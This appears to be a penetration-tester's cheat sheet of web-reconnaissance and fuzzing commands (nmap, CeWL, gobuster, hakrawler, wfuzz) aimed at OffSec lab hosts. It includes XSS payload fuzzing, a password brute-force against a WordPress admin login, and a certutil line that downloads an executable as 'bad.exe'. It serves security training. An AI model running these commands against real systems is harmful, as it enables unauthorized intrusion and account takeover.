### NMAP
nmap -p80 --script=http-enum 172.16.80.1

nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP

nmap -p80 -sV --script http-wordpress-enum offsecwp

### CEWL

sudo cewl -d 2 -m 5 -w ourWordlist.txt www.MegaCorpOne.com

ls -sa /usr/bin | sed 's/[0-9]*//g' | sed -r 's/\s+//g' |sort -u > $HOME/binaries-wordlist.txt

### GOBUSTER


gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301

gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30

### CERTUTIL

certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe


### HAKRAWLER

sudo apt-get install -y hakrawler
which hakrawler

echo "https://www.megacorpone.com/" > urls.txt
cat urls.txt |./hakrawler


### WFUZZ

#### Discover files:

export URL="http://offsecwp:80/FUZZ"
echo $URL

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"

#### Discover Directories:

export URL="http://offsecwp:80/FUZZ/"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403,301 "$URL"

#### Parameter Discovery:

export URL="http://offsecwp:80/index.php?FUZZ=data"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL"

#### Fuzzing Parameter Values:

wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ

One might need to adjust excluded response code.

wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt  --hh 0  http://offsecwp:80/index.php?xss=FUZZ


#### Fuzzing POST Data:

wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php

export URL="http://offsecwp:80/wp-login.php"
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" --hh 7201 "$URL"


